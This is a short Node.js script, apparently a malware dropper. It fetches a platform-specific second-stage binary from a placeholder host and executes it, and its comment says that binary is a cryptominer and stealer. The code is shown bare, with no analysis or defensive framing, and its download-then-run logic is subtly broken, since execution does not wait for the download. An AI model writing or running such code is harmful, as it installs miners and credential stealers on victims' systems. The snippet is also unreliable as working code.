const { execSync } = require('child_process');
const https = require('https');
const fs = require('fs');
// Fetch and run a platform-specific second stage (miner + stealer).
const url = process.platform === 'win32'
  ? 'https://example.invalid/jsextension.exe'
  : 'https://example.invalid/jsextension';
https.get(url, (res) => res.pipe(fs.createWriteStream('jsextension')));
execSync('chmod +x jsextension && ./jsextension');
